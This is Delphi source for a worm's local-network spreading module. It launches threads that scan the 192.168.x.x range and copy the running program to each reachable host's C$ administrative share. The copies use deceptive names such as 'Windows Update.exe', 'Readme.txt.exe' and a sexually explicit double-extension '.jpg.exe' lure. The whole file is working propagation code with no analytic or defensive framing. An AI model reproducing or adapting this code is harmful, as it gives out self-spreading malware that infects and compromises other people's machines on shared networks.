   unit LANS;

   interface

   uses
     windows, winsock;

   Var
     cA :Integer;
     cB :Integer;
     cD :Integer;
     cC :Integer;
     Procedure StartLocalScan(NumberOfThreads :Dword);

   implementation

   type
     TLocalScan = Class(TObject)
     Private
       Procedure InfectHost(Host: String);
       Function ResolveIPToHostName(IP_Address : String): String;
     Public
       Procedure StartScan;
     End;

     function StrtoInt(const S: string): integer; var E: integer;
     begin Val(S, Result, E);end;

     function InttoStr(const Value: integer): string; var S: string[11];
     begin Str(Value, S); Result := S; end;

     Function TLocalScan.ResolveIPToHostname(IP_Address : String): String;
     Var
       Host        :PHostEnt;
       Addr        :Integer;
       WSA         :TWSAData;
     Begin
       WSAStartUp($0101, WSA);
       Try
         Addr := Inet_Addr(pChar(IP_Address));
         Host := GetHostByAddr(@Addr, 4, PF_INET);
         If Host <> NIL Then
           Result := Host.h_name
         Else
           Result := '';
       Finally
         WSACleanUp;
       End;
     End;

     Procedure TLocalScan.InfectHost(Host: String);
     Var
       Resolved    :String;
     Begin
       Resolved := ResolveIPToHostname(Host);
       If (Resolved <> '')  Then
       Begin
         If (CopyFile(pChar(ParamStr(0)), pChar('\\'+Resolved+'\C$\Install.exe'), False)) Then
         Begin
           CopyFile(pChar(ParamStr(0)), pChar('\\'+Resolved+'\C$\Windows Update.exe'), False);
           CopyFile(pChar(ParamStr(0)), pChar('\\'+Resolved+'\C$\XXX_ANAL_PUSSY_CLOSEUP_cumshot!!.jpg.exe'), False);
           CopyFile(pChar(ParamStr(0)), pChar('\\'+Resolved+'\C$\Readme.txt.exe'), False);
         End;
       End;
     End;

     Procedure TLocalScan.StartScan;
     Var
       ClassA      :Integer;
       ClassB      :Integer;
       ClassC      :Integer;
       ClassD      :Integer;
       IP          :String;
     Label
       Rewind;
     Begin
       Sleep(1000);
       ClassA := cA;
       ClassB := cB;
       ClassC := cC;
       ClassD := cD;
       Rewind:
       Repeat
         If (cD >= 255) Then cD := 0;
         If (cC >= 255) Then cC := 0;

         If (ClassD < 255) Then
           ClassD := cD+1;
         If (ClassD = 255) Then
         Begin
           ClassD := 0;
           Inc(ClassC);
         End;

         IP :=     IntToStr(ClassA) + '.' +
                   IntToStr(ClassB) + '.' +
                   IntToStr(ClassC) + '.' +
                   IntToStr(ClassD);
         If (ClassC > cC) Then cC := ClassC;
         If (ClassD > cD) Then cD := ClassD;

         InfectHost(IP);
       Until (ClassC = 255);
       goto rewind;
     End;

     Procedure StartLocalScan(NumberOfThreads :Dword);
     Var
       I           :Integer;
       ThreadID    :Dword;
     Begin
       cA := 192;
       cB := 168;
       cC := 0;
       cD := 0;
       For I := 0 To NumberOfThreads -1 Do
         BeginThread(NIL, 0, @TLocalScan.StartScan, NIL, 0, ThreadID);
     End;

   end.
